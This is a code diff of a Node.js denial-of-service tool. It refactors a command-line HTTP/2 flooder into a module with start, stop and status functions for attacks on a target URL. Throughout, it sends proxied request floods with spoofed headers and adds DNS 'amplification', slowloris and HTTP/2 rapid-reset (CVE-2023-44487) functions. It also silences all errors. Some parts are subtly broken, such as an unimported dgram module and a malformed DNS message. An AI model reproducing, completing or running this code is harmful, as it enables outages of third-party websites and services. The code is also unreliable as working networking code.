@@ -1,11 +1,6 @@
-/**
- * layer7
- */
-
 const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
-const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
@@ -14,11 +9,6 @@ const http = require("http");
 
 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
-
-if (process.argv.length < 5) {
-    console.log(`Usage: node PIN.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://tls.mrrage.xyz 500 8 1`);
-    process.exit();
-}
 
 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
 const ciphers = "GREASE:" + [
@@ -47,7 +37,6 @@ const secureOptions =
     crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 
 const secureProtocol = "TLS_client_method";
-const headers = {};
 
 const secureContextOptions = {
     ciphers: ciphers,
@@ -64,38 +53,12 @@ var proxies = readLines(proxyFile);
 var userAgents = readLines("ua.txt");
 var refList = readLines("ref.txt");
 
-const args = {
-    target: process.argv[2],
-    time: ~~process.argv[3],
-    Rate: ~~process.argv[4],
-    threads: ~~process.argv[5]
-}
-
-const parsedTarget = url.parse(args.target);
-
-if (cluster.isMaster) {
-    for (let counter = 1; counter <= args.threads; counter++) {
-        cluster.fork();
-    }
-
-    console.clear();
-
-    setTimeout(() => {
-        process.exit(1);
-    }, process.argv[3] * 1000);
-
-} else {
-    for (let i = 0; i < 10; i++) {
-        setInterval(runFlooder, 0)
-    }
-}
-
 class NetSocket {
     constructor() {}
     HTTP(options, callback) {
         const parsedAddr = options.address.split(":");
         const addrHost = parsedAddr[0];
-        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
+        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
         const buffer = new Buffer.from(payload);
 
         const connection = net.connect({
@@ -150,40 +113,182 @@ function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
 
-function randomCharacters(length) {
-    output = ""
-    for (let count = 0; count < length; count++) {
-        output += randomElement(characters);
+var running = {};
+
+function runFlooder(parsedTarget, rate, onLog) {
+    const proxies = readLines(proxyFile);
+    const userAgents = readLines("ua.txt");
+    const refList = readLines("ref.txt");
+    const headers = {};
+
+    headers[":method"] = "GET";
+    headers[":path"] = parsedTarget.path;
+    headers["referer"] = randomElement(refList);
+    headers[":scheme"] = "https";
+    headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
+    headers["accept-language"] = "es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3";
+    headers["accept-encoding"] = "gzip, deflate, br";
+    headers["x-forwarded-proto"] = "https";
+    headers["cache-control"] = "no-cache, no-store,private, max-age=0, must-revalidate";
+    headers["sec-ch-ua-mobile"] = randomElement(["?0", "?1"]);
+    headers["sec-ch-ua-platform"] = randomElement(["Android", "iOS", "Linux", "macOS", "Windows"]);
+    headers["sec-fetch-dest"] = "document";
+    headers["sec-fetch-mode"] = "navigate";
+    headers["sec-fetch-site"] = "same-origin";
+    headers["upgrade-insecure-requests"] = "1";
+
+    function doRun() {
+        if (!running[parsedTarget.host]) return;
+
+        const proxyAddr = randomElement(proxies);
+        const parsedProxy = proxyAddr.split(":");
+
+        headers[":authority"] = parsedTarget.host;
+        headers[":path"] = parsedTarget.path;
+        headers["user-agent"] = randomElement(userAgents);
+        headers["x-forwarded-for"] = parsedProxy[0];
+        headers["referer"] = randomElement(refList);
+
+        const proxyOptions = {
+            host: parsedProxy[0],
+            port: ~~parsedProxy[1],
+            address: parsedTarget.host + ":443",
+            timeout: 15
+        };
+
+        Socker.HTTP(proxyOptions, (connection, error) => {
+            if (error || !running[parsedTarget.host]) return;
+
+            connection.setKeepAlive(true, 60000);
+            connection.setNoDelay(true);
+
+            const settings = {
+                enablePush: false,
+                initialWindowSize: 1073741823
+            };
+
+            const tlsOptions = {
+                port: 443,
+                secure: true,
+                ALPNProtocols: ["h2"],
+                ciphers: ciphers,
+                sigalgs: sigalgs,
+                requestCert: true,
+                socket: connection,
+                ecdhCurve: ecdhCurve,
+                honorCipherOrder: false,
+                host: parsedTarget.host,
+                rejectUnauthorized: false,
+                clientCertEngine: "dynamic",
+                secureOptions: secureOptions,
+                secureContext: secureContext,
+                servername: parsedTarget.host,
+                secureProtocol: secureProtocol
+            };
+
+            const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
+
+            tlsConn.allowHalfOpen = true;
+            tlsConn.setNoDelay(true);
+            tlsConn.setKeepAlive(true, 60 * 1000);
+            tlsConn.setMaxListeners(0);
+
+            const client = http2.connect(parsedTarget.href, {
+                protocol: "https:",
+                settings: settings,
+                maxSessionMemory: 3333,
+                maxDeflateDynamicTableSize: 4294967295,
+                createConnection: () => tlsConn
+            });
+
+            client.setMaxListeners(0);
+            client.settings(settings);
+
+            client.on("connect", () => {
+                if (!running[parsedTarget.host]) {
+                    client.destroy();
+                    connection.destroy();
+                    return;
+                }
+                const IntervalAttack = setInterval(() => {
+                    if (!running[parsedTarget.host]) {
+                        clearInterval(IntervalAttack);
+                        client.destroy();
+                        connection.destroy();
+                        return;
+                    }
+                    for (let i = 0; i < rate; i++) {
+                        headers["referer"] = "https://" + parsedTarget.host + parsedTarget.path;
+                        const request = client.request(headers)
+                            .on("response", response => {
+                                request.close();
+                                request.destroy();
+                            });
+                        request.end();
+                    }
+                }, 1000);
+            });
+
+            client.on("close", () => {
+                client.destroy();
+                connection.destroy();
+            });
+
+            client.on("error", () => {
+                client.destroy();
+                connection.destroy();
+            });
+        });
     }
-    return output;
+
+    for (let i = 0; i < 10; i++) {
+        setInterval(doRun, 0);
+    }
 }
 
-headers[":method"] = "GET";
-headers[":path"] = parsedTarget.path;
-headers["referer"] = randomElement(refList);
-headers[":scheme"] = "https";
-headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
-headers["accept-language"] = "es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3";
-headers["accept-encoding"] = "gzip, deflate, br";
-headers["x-forwarded-proto"] = "https";
-headers["cache-control"] = "no-cache, no-store,private, max-age=0, must-revalidate";
-headers["sec-ch-ua-mobile"] = randomElement(["?0", "?1"]);
-headers["sec-ch-ua-platform"] = randomElement(["Android", "iOS", "Linux", "macOS", "Windows"]);
-headers["sec-fetch-dest"] = "document";
-headers["sec-fetch-mode"] = "navigate";
-headers["sec-fetch-site"] = "same-origin";
-headers["upgrade-insecure-requests"] = "1";
+function amplificationAttack(parsedTarget) {
+    if (!running[parsedTarget.host]) return;
+    const dnsServers = ['8.8.8.8', '8.8.4.4', '1.1.1.1'];
+    const targetIp = parsedTarget.hostname;
 
-function runFlooder() {
+    dnsServers.forEach(server => {
+        if (!running[parsedTarget.host]) return;
+        const message = Buffer.from('ANY ' + targetIp);
+        const client = dgram.createSocket('udp4');
+        client.send(message, 0, message.length, 53, server, (err) => {
+            client.close();
+        });
+    });
+}
+
+function slowlorisAttack(parsedTarget) {
+    if (!running[parsedTarget.host]) return;
+    const options = {
+        host: parsedTarget.hostname,
+        port: 80,
+        path: parsedTarget.path,
+        method: 'GET',
+        headers: {
+            'User-Agent': randomElement(userAgents),
+            'Connection': 'Keep-Alive'
+        }
+    };
+
+    const req = http.request(options, (res) => {
+        res.on('data', () => {});
+    });
+
+    req.on('error', () => {});
+    req.end();
+}
+
+function http2RapidResetAttack(parsedTarget, rate) {
+    if (!running[parsedTarget.host]) return;
+
+    const proxies = readLines(proxyFile);
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
 
-    /** headers dynamic */
-    headers[":authority"] = parsedTarget.host;
-    headers[":path"] = parsedTarget.path;
-    headers["user-agent"] = randomElement(userAgents);
-    headers["x-forwarded-for"] = parsedProxy[0];
-    headers["referer"] = randomElement(refList);
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
@@ -192,10 +297,10 @@ function runFlooder() {
     };
 
     Socker.HTTP(proxyOptions, (connection, error) => {
-        if (error) return
+        if (error || !running[parsedTarget.host]) return;
 
         connection.setKeepAlive(true, 60000);
-        connection.setNoDelay(true)
+        connection.setNoDelay(true);
 
         const settings = {
             enablePush: false,
@@ -205,9 +310,7 @@ function runFlooder() {
         const tlsOptions = {
             port: 443,
             secure: true,
-            ALPNProtocols: [
-                "h2"
-            ],
+            ALPNProtocols: ["h2"],
             ciphers: ciphers,
             sigalgs: sigalgs,
             requestCert: true,
@@ -236,7 +339,6 @@ function runFlooder() {
             maxSessionMemory: 3333,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn
-            //socket: connection,
         });
 
         client.setMaxListeners(0);
@@ -244,16 +346,26 @@ function runFlooder() {
 
         client.on("connect", () => {
             const IntervalAttack = setInterval(() => {
-                for (let i = 0; i < args.Rate; i++) {
-                    headers["referer"] = "https://" + parsedTarget.host + parsedTarget.path;
+                if (!running[parsedTarget.host]) {
+                    clearInterval(IntervalAttack);
+                    client.destroy();
+                    connection.destroy();
+                    return;
+                }
+                for (let i = 0; i < rate; i++) {
+                    const headers = {
+                        [":method"]: "GET",
+                        [":authority"]: parsedTarget.host,
+                        [":path"]: parsedTarget.path,
+                        [":scheme"]: "https",
+                        "referer": "https://" + parsedTarget.host + parsedTarget.path,
+                        "user-agent": randomElement(userAgents)
+                    };
                     const request = client.request(headers)
-
-                    .on("response", response => {
-                        request.close();
-                        request.destroy();
-                        return
-                    });
-
+                        .on("response", () => {
+                            request.close();
+                            request.destroy();
+                        });
                     request.end();
                 }
             }, 1000);
@@ -262,145 +374,79 @@ function runFlooder() {
         client.on("close", () => {
             client.destroy();
             connection.destroy();
-            return
         });
 
-        client.on("error", error => {
+        client.on("error", () => {
             client.destroy();
             connection.destroy();
-            return
         });
     });
 }
 
-const KillScript = () => process.exit(1);
+function startAttack(targetUrl, time, rate, threads) {
+    if (running[targetUrl]) return { error: "Attack already running on this target" };
 
-setTimeout(KillScript, args.time * 1000);
+    const parsedTarget = url.parse(targetUrl);
+    if (!parsedTarget.host) return { error: "Invalid URL" };
 
-process.on('uncaughtException', error => {});
-process.on('unhandledRejection', error => {});
+    running[parsedTarget.host] = {
+        target: targetUrl,
+        startTime: Date.now(),
+        duration: time * 1000
+    };
 
-// Amplification Attack
-function amplificationAttack() {
-    const dnsServers = ['8.8.8.8', '8.8.4.4', '1.1.1.1']; // Multiple DNS servers
-    const targetIp = parsedTarget.hostname;
+    for (let counter = 1; counter <= threads; counter++) {
+        runFlooder(parsedTarget, rate);
+    }
 
-    dnsServers.forEach(server => {
-        const message = Buffer.from('ANY ' + targetIp);
+    const ampInterval = setInterval(() => amplificationAttack(parsedTarget), 100);
+    const slowInterval = setInterval(() => slowlorisAttack(parsedTarget), 200);
+    const resetInterval = setInterval(() => http2RapidResetAttack(parsedTarget, rate), 500);
 
-        const client = dgram.createSocket('udp4');
-        client.send(message, 0, message.length, 53, server, (err) => {
-            if (err) {
-                console.error('Amplification attack error:', err);
-            } else {
-                console.log('Amplification attack sent to:', server);
-            }
-            client.close();
-        });
-    });
+    running[parsedTarget.host].intervals = [ampInterval, slowInterval, resetInterval];
+
+    running[parsedTarget.host].timer = setTimeout(() => {
+        stopAttack(targetUrl);
+    }, time * 1000);
+
+    return { success: true, target: targetUrl, duration: time, rate: rate, threads: threads };
 }
 
-// Slowloris / Slow Read Attack
-function slowlorisAttack() {
-    const options = {
-        host: parsedTarget.hostname,
-        port: 80,
-        path: parsedTarget.path,
-        method: 'GET',
-        headers: {
-            'User-Agent': randomElement(userAgents),
-            'Connection': 'Keep-Alive'
+function stopAttack(targetUrl) {
+    const parsedTarget = url.parse(targetUrl);
+    const host = parsedTarget.host;
+    if (!host || !running[host]) return { error: "No attack running on this target" };
+
+    clearTimeout(running[host].timer);
+    if (running[host].intervals) {
+        running[host].intervals.forEach(i => clearInterval(i));
+    }
+    delete running[host];
+    return { success: true, target: targetUrl };
+}
+
+function stopAll() {
+    const hosts = Object.keys(running);
+    hosts.forEach(host => {
+        clearTimeout(running[host].timer);
+        if (running[host].intervals) {
+            running[host].intervals.forEach(i => clearInterval(i));
         }
-    };
-
-    const req = http.request(options, (res) => {
-        res.on('data', (chunk) => {
-            // Slow read by processing data slowly
-            setTimeout(() => {
-                console.log('Receiving data chunk');
-            }, 1000);
-        });
+        delete running[host];
     });
-
-    req.on('error', (e) => {
-        console.error(`Problem with request: ${e.message}`);
-    });
-
-    req.end();
+    return { success: true, stopped: hosts.length };
 }
 
-// HTTP/2 Rapid Reset exploit (CVE-2023-44487)
-function http2RapidResetAttack() {
-    const tlsOptions = {
-        port: 443,
-        secure: true,
-        ALPNProtocols: [
-            "h2"
-        ],
-        ciphers: ciphers,
-        sigalgs: sigalgs,
-        requestCert: true,
-        socket: connection,
-        ecdhCurve: ecdhCurve,
-        honorCipherOrder: false,
-        host: parsedTarget.host,
-        rejectUnauthorized: false,
-        clientCertEngine: "dynamic",
-        secureOptions: secureOptions,
-        secureContext: secureContext,
-        servername: parsedTarget.host,
-        secureProtocol: secureProtocol
-    };
-
-    const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
-
-    tlsConn.allowHalfOpen = true;
-    tlsConn.setNoDelay(true);
-    tlsConn.setKeepAlive(true, 60 * 1000);
-    tlsConn.setMaxListeners(0);
-
-    const client = http2.connect(parsedTarget.href, {
-        protocol: "https:",
-        settings: settings,
-        maxSessionMemory: 3333,
-        maxDeflateDynamicTableSize: 4294967295,
-        createConnection: () => tlsConn
-    });
-
-    client.setMaxListeners(0);
-    client.settings(settings);
-
-    client.on("connect", () => {
-        const IntervalAttack = setInterval(() => {
-            for (let i = 0; i < args.Rate; i++) {
-                headers["referer"] = "https://" + parsedTarget.host + parsedTarget.path;
-                const request = client.request(headers)
-
-                .on("response", response => {
-                    request.close();
-                    request.destroy();
-                    return
-                });
-
-                request.end();
-            }
-        }, 1000);
-    });
-
-    client.on("close", () => {
-        client.destroy();
-        connection.destroy();
-        return
-    });
-
-    client.on("error", error => {
-        client.destroy();
-        connection.destroy();
-        return
-    });
+function getStatus() {
+    const attacks = Object.keys(running).map(host => ({
+        target: running[host].target,
+        elapsed: Math.floor((Date.now() - running[host].startTime) / 1000),
+        duration: running[host].duration / 1000
+    }));
+    return attacks;
 }
 
-// Run the additional attacks
-amplificationAttack();
-slowlorisAttack();
-http2RapidResetAttack();
+process.on('uncaughtException', () => {});
+process.on('unhandledRejection', () => {});
+
+module.exports = { startAttack, stopAttack, stopAll, getStatus };
